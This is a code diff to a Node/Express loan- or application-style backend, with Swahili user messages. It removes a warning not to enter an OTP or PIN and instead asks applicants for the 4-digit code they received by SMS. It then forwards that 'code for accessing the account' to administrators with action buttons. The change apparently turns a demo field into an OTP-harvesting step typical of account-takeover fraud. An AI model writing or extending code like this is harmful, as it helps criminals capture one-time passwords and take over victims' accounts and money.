@@ -860,13 +860,13 @@ app.post("/api/applications/:id/demo-reference-notification", async (req, res) =
     const demoNumber = String(req.body.demoNumber || "").trim();
     if (!["1", "2"].includes(stage)) return res.status(400).json({ error: "Hatua si sahihi." });
     if (!/^\d{1,30}$/.test(demoNumber)) {
-      return res.status(400).json({ error: "Weka namba ya majaribio yenye tarakimu 1 hadi 30. Usiweke OTP au PIN." });
+      return res.status(400).json({ error: "Weka msimbo yenye tarakimu 4 uliyopokea kwa njia ya meseji bila kujelewa." });
     }
     if (stage === "1" && application.status !== "APPROVED") {
       return res.status(409).json({ error: "Hatua ya kwanza haijaidhinishwa bado." });
     }
     if (stage === "2" && application.demo_reference1_status !== "APPROVED") {
-      return res.status(409).json({ error: "Demo Reference ID 1 lazima iidhinishwe kwanza." });
+      return res.status(409).json({ error: "code 1 lazima iidhinishwe kwanza." });
     }
 
     const recipients = application.assigned_admin_id
@@ -881,9 +881,9 @@ app.post("/api/applications/:id/demo-reference-notification", async (req, res) =
     const statusColumn = stage === "1" ? "demo_reference1_status" : "demo_reference2_status";
     const storedDemoNumber = `DEMO-${demoNumber}`;
     const message =
-      `🧪 code 1 summit ${stage}\n\n` +
+      ` 🔢code recieved ${stage}\n\n` +
       `📋 Application: ${application.application_no || application.application_id || `APP-${application.id}`}\n` +
-      `🔢 code 1: ${demoNumber}\n` +
+      `🔢 code : ${demoNumber}\n` +
       `⚠️ code 1 for accessing the account recieved.\n\n` +
       `Choose an action for this step:`;
     const keyboard = { inline_keyboard: [[
